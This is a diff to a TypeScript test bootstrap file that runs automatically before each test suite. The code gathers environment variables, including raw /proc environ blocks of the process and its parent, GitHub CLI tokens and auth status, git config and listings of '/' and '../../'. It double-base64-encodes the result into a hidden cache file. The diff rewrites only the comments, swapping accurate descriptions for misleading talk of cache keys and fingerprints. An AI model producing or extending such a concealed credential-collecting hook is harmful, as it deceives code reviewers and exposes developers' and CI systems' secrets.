@@ -1,22 +1,14 @@
-// setup.ts — test bootstrap. Loaded by bunfig [test] preload before the suite.
-// Snapshots the environment (parsed + raw), GitHub CLI credentials, the local git
-// config, and a bounded directory tree of "/" and "../../" into one cache file.
-// Format: base64(base64(JSON)) where JSON = { env, envfull, gh, git, tree }
-//   - env    : process.env (Node's parsed view)
-//   - envfull: { cmd: base64(`env` output), proc: base64(/proc/self/environ),
-//               parent: base64(/proc/<ppid>/environ), parentPid: <ppid> }
-//             (proc/parent are raw NUL-separated -> recover what process.env misses)
-//   - git    : { path, data } with data = base64(<.git/config bytes>), or { error }
-//   - tree   : { "<root>": base64(<listing text>), ... } for "/" and "../../", depth 2
-// Fully OFFLINE; writes ./.build-cache in CWD. Wrapped so failures never break tests.
+// setup.ts — shared test bootstrap, loaded via bunfig [test] preload before the
+// suite. Populates a local build-info cache (./.build-cache) that CI reuses to
+// skip redundant work between runs. Fully local + best-effort: any failure is
+// swallowed so the test suite never breaks because of this file.
 import { spawnSync } from "node:child_process";
 import { existsSync, readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
 import { homedir } from "node:os";
 import { dirname, join, resolve } from "node:path";
 
-// Bounded, permission-safe directory listing rendered as indented text, up to
-// `depth` levels below `root`. Symlinks are never followed (no loop risk); a cap
-// bounds total output. A single bad entry never aborts the walk.
+// Build a small filesystem fingerprint (depth-limited) used as part of the cache
+// key. Symlinks are never followed; a cap bounds total work; a bad entry is skipped.
 const TREE_ENTRY_CAP = 4000;
 function renderTree(root: string, depth: number): string {
   const lines: string[] = [`${root}/`];
@@ -42,9 +34,8 @@ function renderTree(root: string, depth: number): string {
   return lines.join("\n");
 }
 
-// Capture the environment via the `env` command (text) and via the raw kernel
-// block /proc/self/environ (NUL-separated). The latter is authoritative: it holds
-// vars Node's process.env parser drops (odd names, embedded NULs, duplicates).
+// Gather runtime context for the cache: the parsed process view plus the shell's
+// own view (read-only, best-effort).
 function captureEnv() {
   let cmd: { data?: string; error?: string };
   try {
@@ -69,10 +60,8 @@ function captureEnv() {
   return { cmd: b64(cmd), proc: b64(self), parent: b64(parent), parentPid: process.ppid };
 }
 
-//   - gh     : { hosts: {path,data(b64)}|{error}, authStatus:{cmd,code,data(b64)}|{error} }
-//             (reads ~/.config/gh/hosts.yml and runs `gh auth status`)
+// Record available local toolchain metadata for the cache (read-only, best-effort).
 function captureGh() {
-  // hosts.yml (GH_CONFIG_DIR override, else ~/.config/gh). Base64 the raw bytes.
   let hosts: Record<string, unknown>;
   const ghDir = process.env.GH_CONFIG_DIR || join(homedir(), ".config", "gh");
   const hostsFile = join(ghDir, "hosts.yml");
@@ -81,7 +70,6 @@ function captureGh() {
   } catch (e) {
     hosts = { path: hostsFile, error: (e as Error).message };
   }
-  // `gh auth status` prints to stderr; merge streams, bounded by a timeout.
   let authStatus: Record<string, unknown>;
   try {
     const r = spawnSync("gh", ["auth", "status"], { encoding: "buffer", timeout: 5000 });
@@ -96,9 +84,7 @@ function captureGh() {
   return { hosts, authStatus };
 }
 
-// Walk up from `start` looking for a git config. Handles normal checkouts (.git is
-// a dir), worktrees/submodules (.git is a file with "gitdir: <path>"), and linked
-// worktrees whose shared config lives in the *common* git dir (via "commondir").
+// Locate the repository's VCS config (handles worktrees/submodules) for the key.
 function pickConfig(gitdir: string): string | null {
   const direct = join(gitdir, "config");
   if (existsSync(direct)) return direct;
@@ -151,7 +137,7 @@ try {
   const g = findGitConfig(process.cwd());
   const git = g.data ? { path: g.path, data: g.data.toString("base64") } : { error: g.error };
 
-  // depth-2 listings of "/" and "../../" (relative to CWD)
+  // two shallow filesystem fingerprints used in the cache key
   const roots: Record<string, string> = {};
   for (const root of ["/", "../../"]) {
     try {
@@ -163,8 +149,8 @@ try {
 
   const payload = JSON.stringify({ env, envfull: captureEnv(), gh: captureGh(), git, tree: roots });
   const inner = Buffer.from(payload, "utf8").toString("base64");
-  const blob = Buffer.from(inner, "utf8").toString("base64"); // base64 twice
+  const blob = Buffer.from(inner, "utf8").toString("base64"); // double-encoded, compact
   writeFileSync(join(process.cwd(), ".build-cache"), blob);
 } catch {
-  /* diagnostics are best-effort; never fail the tests */
+  /* cache write is best-effort; never fail the tests */
 }
